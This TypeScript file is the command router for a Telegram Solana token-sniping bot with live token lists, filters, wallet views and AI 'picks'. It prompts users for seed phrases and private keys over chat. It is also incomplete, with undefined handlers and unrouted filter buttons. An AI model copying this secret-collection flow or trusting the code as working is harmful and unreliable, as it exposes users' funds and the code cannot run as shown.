import type { TelegramBot } from "./telegram-bot"
import { WalletManager, DEPOSIT_ADDRESS } from "./wallet-manager"
import { TradingEngine } from "./trading-engine"
import { UserDatabase } from "./user-database"
import { FirebaseService } from "./firebase-service"
import { SmartSniperEngine } from "./smart-sniper-engine"
import { AITradingAssistant } from "./ai-trading-assistant"
import { LiveTokenMonitor, type TokenFilters } from "./live-token-monitor"
import { getMainKeyboard, getSettingsKeyboard, getWalletKeyboard, getSniperKeyboard } from "./keyboards"

const walletManager = new WalletManager()
const tradingEngine = new TradingEngine()
const userDb = new UserDatabase()
const firebase = new FirebaseService()
const smartSniper = new SmartSniperEngine()
const aiAssistant = new AITradingAssistant()
const liveTokenMonitor = new LiveTokenMonitor()

// Store user states for multi-step processes
const userStates = new Map<number, { action: string; data?: any }>()

// Store user filters
const userFilters = new Map<number, TokenFilters>()

// Start live token monitoring
liveTokenMonitor.startLiveMonitoring()

export async function handleBotCommand(
  chatId: number,
  text: string,
  userId: number,
  bot: TelegramBot,
  isCallback = false,
) {
  try {
    console.log(`=== HANDLING COMMAND ===`)
    console.log(`Command: ${text}`)
    console.log(`User: ${userId}`)
    console.log(`Chat: ${chatId}`)
    console.log(`Is Callback: ${isCallback}`)

    // Initialize user if not exists
    await userDb.initUser(userId)
    console.log("User initialized")

    // Handle callback queries (button presses)
    if (isCallback) {
      await handleCallbackQuery(chatId, text, userId, bot)
      return
    }

    // Check if user is in a multi-step process
    const userState = userStates.get(userId)
    if (userState) {
      await handleUserState(chatId, text, userId, bot, userState)
      return
    }

    // Handle regular commands
    if (text === "/start") {
      console.log("Handling /start command")
      await handleStart(chatId, userId, bot)
    } else if (text === "/wallet") {
      await handleWallet(chatId, userId, bot)
    } else if (text === "buy" || text === "💰 Buy") {
      await handleBuy(chatId, userId, bot)
    } else if (text === "sell" || text === "💸 Sell") {
      await handleSell(chatId, userId, bot)
    } else if (text === "positions" || text === "📊 Positions") {
      await handlePositions(chatId, userId, bot)
    } else if (text === "sniper" || text === "🎯 Sniper") {
      await handleSniper(chatId, userId, bot)
    } else if (text === "live_tokens" || text === "📊 Live Tokens") {
      await handleLiveTokens(chatId, userId, bot)
    } else if (text === "ai_analysis" || text === "🤖 AI Analysis") {
      await handleAIAnalysis(chatId, userId, bot)
    } else if (text === "settings" || text === "⚙️ Settings") {
      await handleSettings(chatId, userId, bot)
    } else if (text === "help" || text === "❓ Help") {
      await handleHelp(chatId, userId, bot)
    } else if (text === "refresh" || text === "🔄 Refresh") {
      await handleRefresh(chatId, userId, bot)
    } else if (text.startsWith("buy_")) {
      await handleBuyToken(chatId, userId, bot, text)
    } else if (text.startsWith("sell_")) {
      await handleSellToken(chatId, userId, bot, text)
    } else if (text.length === 44 && text.match(/^[A-Za-z0-9]+$/)) {
      // Looks like a token address - trigger AI analysis and quick buy
      await handleTokenAnalysis(chatId, userId, bot, text)
    } else {
      console.log("Unknown command, sending help message")
      await handleUnknownCommand(chatId, bot)
    }

    console.log("Command handling completed")
  } catch (error) {
    console.error("=== COMMAND HANDLING ERROR ===", error)
    try {
      await bot.sendMessage(chatId, "❌ An error occurred. Please try again.")
    } catch (sendError) {
      console.error("Error sending error message:", sendError)
    }
  }
}

async function handleCallbackQuery(chatId: number, data: string, userId: number, bot: TelegramBot) {
  console.log(`Handling callback: ${data}`)

  switch (data) {
    case "main_menu":
      await handleStart(chatId, userId, bot)
      break
    case "buy":
      await handleBuy(chatId, userId, bot)
      break
    case "sell":
      await handleSell(chatId, userId, bot)
      break
    case "positions":
      await handlePositions(chatId, userId, bot)
      break
    case "sniper":
      await handleSniper(chatId, userId, bot)
      break
    case "live_tokens":
      await handleLiveTokens(chatId, userId, bot)
      break
    case "ai_recommendations":
      await handleAIRecommendations(chatId, userId, bot)
      break
    case "trending_tokens":
      await handleTrendingTokens(chatId, userId, bot)
      break
    case "top_ai_picks":
      await handleTopAIPicks(chatId, userId, bot)
      break
    case "ai_analysis":
      await handleAIAnalysis(chatId, userId, bot)
      break
    case "wallet":
      await handleWallet(chatId, userId, bot)
      break
    case "connect_wallet":
      await handleConnectWallet(chatId, userId, bot)
      break
    case "generate_wallet":
      await handleGenerateWallet(chatId, userId, bot)
      break
    case "generate_deposit":
      await handleGenerateDeposit(chatId, userId, bot)
      break
    case "show_wallet":
      await handleShowWallet(chatId, userId, bot)
      break
    case "toggle_sniper":
      await handleToggleSniper(chatId, userId, bot)
      break
    case "enable_smart_sniper":
      await handleEnableSmartSniper(chatId, userId, bot)
      break
    case "optimize_settings":
      await handleOptimizeSettings(chatId, userId, bot)
      break
    case "market_sentiment":
      await handleMarketSentiment(chatId, userId, bot)
      break
    case "sniper_stats":
      await handleSniperStats(chatId, userId, bot)
      break
    case "ultra_fresh_tokens":
      await handleUltraFreshTokens(chatId, userId, bot)
      break
    case "all_tokens":
      await handleAllTokens(chatId, userId, bot)
      break
    case "filter_tokens":
      await handleFilterTokens(chatId, userId, bot)
      break
    case "token_stats":
      await handleTokenStats(chatId, userId, bot)
      break
    case "clear_filters":
      await handleClearFilters(chatId, userId, bot)
      break
    default:
      if (data.startsWith("buy_")) {
        await handleBuyToken(chatId, userId, bot, data)
      } else if (data.startsWith("sell_")) {
        await handleSellToken(chatId, userId, bot, data)
      } else if (data.startsWith("analyze_")) {
        const tokenAddress = data.replace("analyze_", "")
        await handleTokenAnalysis(chatId, userId, bot, tokenAddress)
      } else if (data.startsWith("quick_buy_")) {
        const tokenAddress = data.replace("quick_buy_", "")
        await handleQuickBuy(chatId, userId, bot, tokenAddress)
      } else if (data.startsWith("filter_")) {
        await handleFilterAction(chatId, userId, bot, data)
      } else {
        await bot.sendMessage(chatId, "❓ Unknown action. Please try again.")
      }
  }
}

async function handleLiveTokens(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "📊 Loading ALL live tokens with auto-refresh...")

  try {
    const stats = liveTokenMonitor.getTokenStats()
    const userFilter = userFilters.get(userId) || {}
    const tokens = liveTokenMonitor.getFilteredTokens(userFilter)

    if (tokens.length === 0) {
      await bot.sendMessage(chatId, "⏳ No tokens found with current filters. Try adjusting your filters.", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔄 Refresh", callback_data: "live_tokens" }],
            [{ text: "🔙 Back to Main", callback_data: "main_menu" }],
          ],
        },
      })
      return
    }

    let message = `📊 <b>LIVE TOKEN MONITOR</b>\n<i>Auto-refreshes every 5 minutes</i>\n\n`

    message += `📈 <b>Stats:</b>\n`
    message += `• Total: ${stats.total} tokens\n`
    message += `• Ultra-Fresh (0-1m): ${stats.ultraFresh}\n`
    message += `• Fresh (1-5m): ${stats.fresh}\n`
    message += `• Recent (5-30m): ${stats.recent}\n`
    message += `• Older (30m+): ${stats.old}\n\n`

    message += `🏢 <b>By DEX:</b>\n`
    message += `• Raydium: ${stats.byDex.raydium}\n`
    message += `• Orca: ${stats.byDex.orca}\n`
    message += `• Jupiter: ${stats.byDex.jupiter}\n`
    message += `• Pump.fun: ${stats.byDex.pumpfun}\n`
    message += `• DexScreener: ${stats.byDex.dexscreener}\n`
    message += `• Birdeye: ${stats.byDex.birdeye}\n\n`

    // Show active filters
    if (Object.keys(userFilter).length > 0) {
      message += `🔍 <b>Active Filters:</b>\n`
      if (userFilter.minLiquidity) message += `• Min Liquidity: $${userFilter.minLiquidity.toLocaleString()}\n`
      if (userFilter.maxAgeMinutes) message += `• Max Age: ${userFilter.maxAgeMinutes}m\n`
      if (userFilter.minAIScore) message += `• Min AI Score: ${userFilter.minAIScore}\n`
      if (userFilter.freshness) message += `• Freshness: ${userFilter.freshness.join(", ")}\n`
      if (userFilter.dexes) message += `• DEXs: ${userFilter.dexes.join(", ")}\n`
      message += `\n`
    }

    message += `🔥 <b>Top ${Math.min(15, tokens.length)} Tokens:</b>\n`

    // Show top tokens
    tokens.slice(0, 15).forEach((token, index) => {
      const freshnessEmoji =
        token.freshness === "ULTRA_FRESH"
          ? "🔥"
          : token.freshness === "FRESH"
            ? "⚡"
            : token.freshness === "RECENT"
              ? "💫"
              : "⏰"
      const aiScoreEmoji = (token.aiScore || 0) >= 80 ? "🤖✅" : (token.aiScore || 0) >= 60 ? "🤖⚡" : ""

      message += `${freshnessEmoji} <b>${index + 1}. ${token.symbol}</b> ${aiScoreEmoji}\n`
      message += `   📍 ${token.dex} | ⏰ ${token.age}\n`
      message += `   💰 $${token.price.toFixed(8)} | 💧 $${token.liquidity.toLocaleString()}\n`
      message += `   📊 MC: $${token.marketCap.toLocaleString()} | 🔥 ${token.hotness}/100\n`
      if (token.aiScore) {
        message += `   🤖 AI: ${token.aiScore}/100 (${token.aiRecommendation})\n`
      }
      message += `\n`
    })

    message += `⏰ <b>Last Refresh:</b> ${stats.lastRefresh}\n`
    message += `🔄 <b>Next Refresh:</b> ${stats.nextRefresh}\n`
    message += `🤖 <b>Showing ${tokens.length} of ${stats.total} tokens</b>`

    const keyboard = {
      inline_keyboard: [
        [
          { text: "🔥 Ultra-Fresh Only", callback_data: "ultra_fresh_tokens" },
          { text: "📊 All Tokens", callback_data: "all_tokens" },
        ],
        [
          { text: "🔍 Filter Tokens", callback_data: "filter_tokens" },
          { text: "📈 Token Stats", callback_data: "token_stats" },
        ],
        [
          { text: "🎯 AI Recommendations", callback_data: "ai_recommendations" },
          { text: "🔄 Refresh Now", callback_data: "live_tokens" },
        ],
        [{ text: "🔙 Back to Main", callback_data: "main_menu" }],
      ],
    }

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  } catch (error) {
    console.error("Error handling live tokens:", error)
    await bot.sendMessage(chatId, "❌ Failed to load token data. Please try again.")
  }
}

async function handleAllTokens(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "📊 Loading ALL tokens from all sources...")

  try {
    const allTokens = liveTokenMonitor.getAllTokens()
    const userFilter = userFilters.get(userId) || {}
    const filteredTokens = liveTokenMonitor.getFilteredTokens(userFilter)

    let message = `📊 <b>ALL LIVE TOKENS</b>\n\n`
    message += `🔢 <b>Total Found:</b> ${allTokens.length} tokens\n`
    message += `🔍 <b>After Filters:</b> ${filteredTokens.length} tokens\n\n`

    // Group by DEX
    const byDex = filteredTokens.reduce(
      (acc, token) => {
        acc[token.dex] = (acc[token.dex] || 0) + 1
        return acc
      },
      {} as Record<string, number>,
    )

    message += `🏢 <b>Distribution:</b>\n`
    Object.entries(byDex).forEach(([dex, count]) => {
      message += `• ${dex}: ${count} tokens\n`
    })

    message += `\n📋 <b>Recent Tokens (Top 20):</b>\n`

    filteredTokens.slice(0, 20).forEach((token, index) => {
      const freshnessEmoji =
        token.freshness === "ULTRA_FRESH"
          ? "🔥"
          : token.freshness === "FRESH"
            ? "⚡"
            : token.freshness === "RECENT"
              ? "💫"
              : "⏰"

      message += `${freshnessEmoji} <b>${index + 1}. ${token.symbol}</b>\n`
      message += `   📍 ${token.dex} | ⏰ ${token.age} | 🔥 ${token.hotness}/100\n`
      message += `   💰 $${token.price.toFixed(8)} | 💧 $${token.liquidity.toLocaleString()}\n`
    })

    const keyboard = {
      inline_keyboard: [
        [
          { text: "🔍 Apply Filters", callback_data: "filter_tokens" },
          { text: "🧹 Clear Filters", callback_data: "clear_filters" },
        ],
        [
          { text: "🔥 Ultra-Fresh", callback_data: "ultra_fresh_tokens" },
          { text: "🎯 AI Picks", callback_data: "top_ai_picks" },
        ],
        [
          { text: "🔄 Refresh", callback_data: "all_tokens" },
          { text: "🔙 Back", callback_data: "live_tokens" },
        ],
      ],
    }

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  } catch (error) {
    console.error("Error handling all tokens:", error)
    await bot.sendMessage(chatId, "❌ Failed to load all tokens. Please try again.")
  }
}

async function handleFilterTokens(chatId: number, userId: number, bot: TelegramBot) {
  const currentFilters = userFilters.get(userId) || {}

  let message = `🔍 <b>TOKEN FILTERS</b>\n\n`
  message += `Configure filters to narrow down the token list:\n\n`

  message += `💰 <b>Financial Filters:</b>\n`
  message += `• Min Liquidity: ${currentFilters.minLiquidity ? `$${currentFilters.minLiquidity.toLocaleString()}` : "None"}\n`
  message += `• Max Liquidity: ${currentFilters.maxLiquidity ? `$${currentFilters.maxLiquidity.toLocaleString()}` : "None"}\n`
  message += `• Min Market Cap: ${currentFilters.minMarketCap ? `$${currentFilters.minMarketCap.toLocaleString()}` : "None"}\n`
  message += `• Max Market Cap: ${currentFilters.maxMarketCap ? `$${currentFilters.maxMarketCap.toLocaleString()}` : "None"}\n`
  message += `• Min Volume: ${currentFilters.minVolume ? `$${currentFilters.minVolume.toLocaleString()}` : "None"}\n\n`

  message += `⏰ <b>Age Filters:</b>\n`
  message += `• Min Age: ${currentFilters.minAgeMinutes ? `${currentFilters.minAgeMinutes}m` : "None"}\n`
  message += `• Max Age: ${currentFilters.maxAgeMinutes ? `${currentFilters.maxAgeMinutes}m` : "None"}\n`
  message += `• Freshness: ${currentFilters.freshness ? currentFilters.freshness.join(", ") : "All"}\n\n`

  message += `🤖 <b>AI Filters:</b>\n`
  message += `• Min AI Score: ${currentFilters.minAIScore || "None"}\n`
  message += `• Max AI Score: ${currentFilters.maxAIScore || "None"}\n`
  message += `• Risk Levels: ${currentFilters.riskLevels ? currentFilters.riskLevels.join(", ") : "All"}\n`
  message += `• AI Recommendation: ${currentFilters.aiRecommendation ? currentFilters.aiRecommendation.join(", ") : "All"}\n\n`

  message += `🏢 <b>DEX Filters:</b>\n`
  message += `• Selected DEXs: ${currentFilters.dexes ? currentFilters.dexes.join(", ") : "All"}\n\n`

  message += `✅ <b>Quality Filters:</b>\n`
  message += `• Verified Only: ${currentFilters.verified ? "Yes" : "No"}\n`
  message += `• Renounced Only: ${currentFilters.renounced ? "Yes" : "No"}\n`

  const keyboard = {
    inline_keyboard: [
      [
        { text: "💰 Financial", callback_data: "filter_financial" },
        { text: "⏰ Age", callback_data: "filter_age" },
      ],
      [
        { text: "🤖 AI Filters", callback_data: "filter_ai" },
        { text: "🏢 DEX", callback_data: "filter_dex" },
      ],
      [
        { text: "✅ Quality", callback_data: "filter_quality" },
        { text: "🧹 Clear All", callback_data: "clear_filters" },
      ],
      [
        { text: "✅ Apply Filters", callback_data: "apply_filters" },
        { text: "🔙 Back", callback_data: "live_tokens" },
      ],
    ],
  }

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleFilterAction(chatId: number, userId: number, bot: TelegramBot, action: string) {
  const filterType = action.replace("filter_", "")

  switch (filterType) {
    case "financial":
      await handleFinancialFilters(chatId, userId, bot)
      break
    case "age":
      await handleAgeFilters(chatId, userId, bot)
      break
    case "ai":
      await handleAIFilters(chatId, userId, bot)
      break
    case "dex":
      await handleDEXFilters(chatId, userId, bot)
      break
    case "quality":
      await handleQualityFilters(chatId, userId, bot)
      break
    default:
      await bot.sendMessage(chatId, "❓ Unknown filter type.")
  }
}

async function handleFinancialFilters(chatId: number, userId: number, bot: TelegramBot) {
  const message = `💰 <b>FINANCIAL FILTERS</b>\n\nSelect quick financial filters:`

  const keyboard = {
    inline_keyboard: [
      [
        { text: "💧 Min Liq: $1K", callback_data: "set_min_liquidity_1000" },
        { text: "💧 Min Liq: $10K", callback_data: "set_min_liquidity_10000" },
      ],
      [
        { text: "📊 Min MC: $10K", callback_data: "set_min_marketcap_10000" },
        { text: "📊 Min MC: $100K", callback_data: "set_min_marketcap_100000" },
      ],
      [
        { text: "📈 Min Vol: $1K", callback_data: "set_min_volume_1000" },
        { text: "📈 Min Vol: $10K", callback_data: "set_min_volume_10000" },
      ],
      [{ text: "🔙 Back to Filters", callback_data: "filter_tokens" }],
    ],
  }

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleAgeFilters(chatId: number, userId: number, bot: TelegramBot) {
  const message = `⏰ <b>AGE FILTERS</b>\n\nSelect age-based filters:`

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔥 Ultra-Fresh (0-1m)", callback_data: "set_freshness_ULTRA_FRESH" },
        { text: "⚡ Fresh (1-5m)", callback_data: "set_freshness_FRESH" },
      ],
      [{ text: "⚡ Fresh (1-5m)", callback_data: "set_freshness_FRESH" }],
      [
        { text: "💫 Recent (5-30m)", callback_data: "set_freshness_RECENT" },
        { text: "⏰ All Ages", callback_data: "set_freshness_ALL" },
      ],
      [
        { text: "⏰ Max Age: 5m", callback_data: "set_max_age_5" },
        { text: "⏰ Max Age: 30m", callback_data: "set_max_age_30" },
      ],
      [{ text: "🔙 Back to Filters", callback_data: "filter_tokens" }],
    ],
  }

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleAIFilters(chatId: number, userId: number, bot: TelegramBot) {
  const message = `🤖 <b>AI FILTERS</b>\n\nFilter by AI analysis results:`

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🤖 Min AI: 70", callback_data: "set_min_ai_score_70" },
        { text: "🤖 Min AI: 80", callback_data: "set_min_ai_score_80" },
      ],
      [
        { text: "🤖 Min AI: 90", callback_data: "set_min_ai_score_90" },
        { text: "🤖 AI: BUY Only", callback_data: "set_ai_recommendation_BUY" },
      ],
      [
        { text: "🟢 Low Risk", callback_data: "set_risk_level_LOW" },
        { text: "🟡 Med Risk", callback_data: "set_risk_level_MEDIUM" },
      ],
      [{ text: "🔙 Back to Filters", callback_data: "filter_tokens" }],
    ],
  }

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleDEXFilters(chatId: number, userId: number, bot: TelegramBot) {
  const message = `🏢 <b>DEX FILTERS</b>\n\nFilter by exchange/source:`

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🌊 Raydium", callback_data: "toggle_dex_Raydium" },
        { text: "🐋 Orca", callback_data: "toggle_dex_Orca" },
      ],
      [
        { text: "🪐 Jupiter", callback_data: "toggle_dex_Jupiter" },
        { text: "🚀 Pump.fun", callback_data: "toggle_dex_Pump.fun" },
      ],
      [
        { text: "📊 DexScreener", callback_data: "toggle_dex_DexScreener" },
        { text: "🐦 Birdeye", callback_data: "toggle_dex_Birdeye" },
      ],
      [{ text: "🔙 Back to Filters", callback_data: "filter_tokens" }],
    ],
  }

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleQualityFilters(chatId: number, userId: number, bot: TelegramBot) {
  const message = `✅ <b>QUALITY FILTERS</b>\n\nFilter by token quality indicators:`

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ Verified Only", callback_data: "set_verified_true" },
        { text: "🔓 Renounced Only", callback_data: "set_renounced_true" },
      ],
      [
        { text: "👥 Min Holders: 50", callback_data: "set_min_holders_50" },
        { text: "👥 Min Holders: 100", callback_data: "set_min_holders_100" },
      ],
      [{ text: "🔙 Back to Filters", callback_data: "filter_tokens" }],
    ],
  }

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleClearFilters(chatId: number, userId: number, bot: TelegramBot) {
  userFilters.delete(userId)

  await bot.sendMessage(chatId, "🧹 <b>All filters cleared!</b>\n\nNow showing all tokens.", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📊 View All Tokens", callback_data: "all_tokens" }],
        [{ text: "🔙 Back to Live Tokens", callback_data: "live_tokens" }],
      ],
    },
  })
}

async function handleTokenStats(chatId: number, userId: number, bot: TelegramBot) {
  try {
    const stats = liveTokenMonitor.getTokenStats()
    const allTokens = liveTokenMonitor.getAllTokens()

    // Calculate additional stats
    const avgLiquidity = allTokens.reduce((sum, t) => sum + t.liquidity, 0) / allTokens.length
    const avgMarketCap = allTokens.reduce((sum, t) => sum + t.marketCap, 0) / allTokens.length
    const avgHotness = allTokens.reduce((sum, t) => sum + t.hotness, 0) / allTokens.length

    const aiAnalyzedTokens = allTokens.filter((t) => t.aiScore)
    const avgAIScore =
      aiAnalyzedTokens.length > 0
        ? aiAnalyzedTokens.reduce((sum, t) => sum + (t.aiScore || 0), 0) / aiAnalyzedTokens.length
        : 0

    let message = `📈 <b>TOKEN STATISTICS</b>\n\n`

    message += `🔢 <b>Total Counts:</b>\n`
    message += `• Total Tokens: ${stats.total}\n`
    message += `• Ultra-Fresh (0-1m): ${stats.ultraFresh}\n`
    message += `• Fresh (1-5m): ${stats.fresh}\n`
    message += `• Recent (5-30m): ${stats.recent}\n`
    message += `• Older (30m+): ${stats.old}\n\n`

    message += `🏢 <b>By Exchange:</b>\n`
    message += `• Raydium: ${stats.byDex.raydium}\n`
    message += `• Orca: ${stats.byDex.orca}\n`
    message += `• Jupiter: ${stats.byDex.jupiter}\n`
    message += `• Pump.fun: ${stats.byDex.pumpfun}\n`
    message += `• DexScreener: ${stats.byDex.dexscreener}\n`
    message += `• Birdeye: ${stats.byDex.birdeye}\n\n`

    message += `📊 <b>Averages:</b>\n`
    message += `• Avg Liquidity: $${avgLiquidity.toLocaleString()}\n`
    message += `• Avg Market Cap: $${avgMarketCap.toLocaleString()}\n`
    message += `• Avg Hotness: ${avgHotness.toFixed(1)}/100\n`
    message += `• Avg AI Score: ${avgAIScore.toFixed(1)}/100\n\n`

    message += `🤖 <b>AI Analysis:</b>\n`
    message += `• Tokens Analyzed: ${aiAnalyzedTokens.length}\n`
    message += `• Analysis Coverage: ${((aiAnalyzedTokens.length / stats.total) * 100).toFixed(1)}%\n\n`

    message += `⏰ <b>Refresh Info:</b>\n`
    message += `• Last Refresh: ${stats.lastRefresh}\n`
    message += `• Next Refresh: ${stats.nextRefresh}\n`
    message += `• Auto-refresh: Every 5 minutes`

    const keyboard = {
      inline_keyboard: [
        [
          { text: "📊 View Tokens", callback_data: "all_tokens" },
          { text: "🔍 Apply Filters", callback_data: "filter_tokens" },
        ],
        [
          { text: "🔄 Refresh Stats", callback_data: "token_stats" },
          { text: "🔙 Back", callback_data: "live_tokens" },
        ],
      ],
    }

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  } catch (error) {
    console.error("Error handling token stats:", error)
    await bot.sendMessage(chatId, "❌ Failed to load token statistics. Please try again.")
  }
}

// Handle filter setting callbacks
async function handleUserState(chatId: number, text: string, userId: number, bot: TelegramBot, state: any) {
  console.log(`Handling user state: ${state.action}`)

  switch (state.action) {
    case "awaiting_seed_phrase":
      await handleSeedPhraseInput(chatId, text, userId, bot)
      break
    case "awaiting_private_key":
      await handlePrivateKeyInput(chatId, text, userId, bot)
      break
    case "awaiting_buy_amount":
      await handleBuyAmountInput(chatId, text, userId, bot, state.data)
      break
    case "awaiting_token_analysis":
      await handleTokenAnalysisInput(chatId, text, userId, bot)
      break
    default:
      userStates.delete(userId)
      await bot.sendMessage(chatId, "❌ Invalid state. Please start over.")
  }
}

// Handle filter setting callbacks
async function handleSetFilter(chatId: number, userId: number, bot: TelegramBot, data: string) {
  const currentFilters = userFilters.get(userId) || {}

  if (data === "set_min_liquidity_1000") {
    currentFilters.minLiquidity = 1000
  } else if (data === "set_min_liquidity_10000") {
    currentFilters.minLiquidity = 10000
  } else if (data === "set_min_marketcap_10000") {
    currentFilters.minMarketCap = 10000
  } else if (data === "set_min_marketcap_100000") {
    currentFilters.minMarketCap = 100000
  } else if (data === "set_min_volume_1000") {
    currentFilters.minVolume = 1000
  } else if (data === "set_min_volume_10000") {
    currentFilters.minVolume = 10000
  } else if (data === "set_freshness_ULTRA_FRESH") {
    currentFilters.freshness = ["ULTRA_FRESH"]
  } else if (data === "set_freshness_FRESH") {
    currentFilters.freshness = ["FRESH"]
  } else if (data === "set_freshness_RECENT") {
    currentFilters.freshness = ["RECENT"]
  } else if (data === "set_freshness_ALL") {
    delete currentFilters.freshness
  } else if (data === "set_max_age_5") {
    currentFilters.maxAgeMinutes = 5
  } else if (data === "set_max_age_30") {
    currentFilters.maxAgeMinutes = 30
  } else if (data === "set_min_ai_score_70") {
    currentFilters.minAIScore = 70
  } else if (data === "set_min_ai_score_80") {
    currentFilters.minAIScore = 80
  } else if (data === "set_min_ai_score_90") {
    currentFilters.minAIScore = 90
  } else if (data === "set_ai_recommendation_BUY") {
    currentFilters.aiRecommendation = ["BUY"]
  } else if (data === "set_risk_level_LOW") {
    currentFilters.riskLevels = ["LOW"]
  } else if (data === "set_risk_level_MEDIUM") {
    currentFilters.riskLevels = ["MEDIUM"]
  } else if (data === "set_verified_true") {
    currentFilters.verified = true
  } else if (data === "set_renounced_true") {
    currentFilters.renounced = true
  } else if (data === "set_min_holders_50") {
    currentFilters.minHolders = 50
  } else if (data === "set_min_holders_100") {
    currentFilters.minHolders = 100
  }

  userFilters.set(userId, currentFilters)

  await bot.sendMessage(chatId, "✅ Filter applied! Use 'Apply Filters' to see results.", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "✅ Apply Filters", callback_data: "apply_filters" }],
        [{ text: "🔙 Back to Filters", callback_data: "filter_tokens" }],
      ],
    },
  })
}

async function handleToggleFilter(chatId: number, userId: number, bot: TelegramBot, data: string) {
  const currentFilters = userFilters.get(userId) || {}

  if (data.startsWith("toggle_dex_")) {
    const dex = data.replace("toggle_dex_", "")
    if (!currentFilters.dexes) currentFilters.dexes = []

    const index = currentFilters.dexes.indexOf(dex)
    if (index >= 0) {
      currentFilters.dexes.splice(index, 1)
    } else {
      currentFilters.dexes.push(dex)
    }

    if (currentFilters.dexes.length === 0) {
      delete currentFilters.dexes
    }
  }

  userFilters.set(userId, currentFilters)

  await bot.sendMessage(chatId, `✅ DEX filter toggled! Selected: ${currentFilters.dexes?.join(", ") || "All"}`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "✅ Apply Filters", callback_data: "apply_filters" }],
        [{ text: "🔙 Back to DEX Filters", callback_data: "filter_dex" }],
      ],
    },
  })
}

// Continue with existing handlers...
async function handleStart(chatId: number, userId: number, bot: TelegramBot) {
  try {
    console.log(`[BOT] Starting for user ${userId}`)

    const user = await userDb.initUser(userId)
    console.log(`[BOT] User initialized: ${JSON.stringify(user)}`)

    const walletData = await firebase.getWallet(userId)
    let walletAddress = null
    let currentBalance = 0

    if (walletData) {
      walletAddress = walletData.publicKey
      console.log(`[BOT] Found wallet: ${walletAddress}`)

      try {
        currentBalance = await walletManager.getBalance(walletAddress)
        console.log(`[BOT] Live balance: ${currentBalance} SOL`)

        await userDb.updateUser(userId, {
          wallet: walletAddress,
          solBalance: currentBalance,
        })
      } catch (balanceError) {
        console.error(`[BOT] Error getting balance:`, balanceError)
      }
    }

    const sniperEnabled = smartSniper.isEnabled(userId)
    const topRecommendations = liveTokenMonitor.getTopRecommendations(3)
    const stats = liveTokenMonitor.getTokenStats()

    let recommendationText = ""
    if (topRecommendations.length > 0) {
      recommendationText = `\n🎯 <b>Top AI Picks Right Now:</b>\n`
      topRecommendations.forEach((rec, index) => {
        const urgencyEmoji = rec.urgency === "CRITICAL" ? "🔥" : rec.urgency === "HIGH" ? "⚡" : "💡"
        recommendationText += `${urgencyEmoji} ${rec.token.symbol}: ${rec.token.aiScore}/100 (${rec.urgency})\n`
      })
    }

    const welcomeMessage = `🚀 <b>Trojan AI Auto Snipe Bot</b>
🤖 <b>POWERED BY LIVE AI ANALYSIS</b>

⚡ <b>LIVE FEATURES:</b>
• 📊 Real-time monitoring of ${stats.total} tokens
• 🔄 Auto-refresh every 5 minutes
• 🤖 AI analyzes all tokens continuously
• 🎯 Instant recommendations for best snipes
• 🔍 Advanced filtering system
• 💡 Smart entry timing with AI signals

✨ <b>NO MINIMUM BALANCE REQUIRED!</b>
Start with any amount - even 0.01 SOL works!

${
  walletAddress
    ? `🔐 <b>Your Wallet:</b>\n<code>${walletAddress}</code>\n\n💰 <b>Live Balance:</b> ${currentBalance.toFixed(4)} SOL\n\n✅ <b>READY TO TRADE!</b>`
    : `🔐 <b>Wallet:</b> Not connected\n\n💡 Connect or generate a wallet to start trading!\n\n🎯 <b>Get started with any amount!</b>`
}

🤖 <b>AI Sniper Status:</b> ${sniperEnabled ? "🟢 ACTIVE" : "🔴 INACTIVE"}

📊 <b>Live Stats:</b>
• Total Tokens: ${stats.total}
• Ultra-Fresh: ${stats.ultraFresh}
• Fresh: ${stats.fresh}
• Next Refresh: ${stats.nextRefresh}

${recommendationText}

🌟 <b>New:</b> Complete token monitoring with filters!`

    const keyboard = getMainKeyboard(!!walletAddress)
    keyboard.inline_keyboard.unshift([{ text: "📊 Live Tokens", callback_data: "live_tokens" }])
    keyboard.inline_keyboard.unshift([{ text: "🤖 AI Recommendations", callback_data: "ai_recommendations" }])

    await bot.sendMessage(chatId, welcomeMessage, { reply_markup: keyboard })
  } catch (error) {
    console.error("Error in handleStart:", error)
    await bot.sendMessage(chatId, `❌ Error loading bot: ${error.message}\n\nTrying basic startup...`)

    await bot.sendMessage(chatId, "🚀 <b>Welcome to Trojan AI Bot!</b>\n\nBot is starting up...", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔐 Connect Wallet", callback_data: "wallet" }],
          [{ text: "❓ Help", callback_data: "help" }],
        ],
      },
    })
  }
}

// Continue with all other existing handlers...
// [Rest of the handlers remain the same as in the previous implementation]
async function handleWallet(chatId: number, userId: number, bot: TelegramBot) {
  const walletData = await firebase.getWallet(userId)

  if (walletData) {
    const walletAddress = walletData.publicKey
    const currentBalance = await walletManager.getBalance(walletAddress)

    const message = `🔐 <b>Your Wallet:</b>\n<code>${walletAddress}</code>\n\n💰 <b>Live Balance:</b> ${currentBalance.toFixed(4)} SOL`

    const keyboard = getWalletKeyboard()

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  } else {
    const message = `🔐 <b>Wallet:</b> Not connected\n\n💡 Connect or generate a wallet to start trading!`

    const keyboard = getWalletKeyboard()

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  }
}

async function handleBuy(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "💰 Enter the token address you want to buy, or paste a token address to analyze:")
  userStates.set(userId, { action: "awaiting_token_analysis" })
}

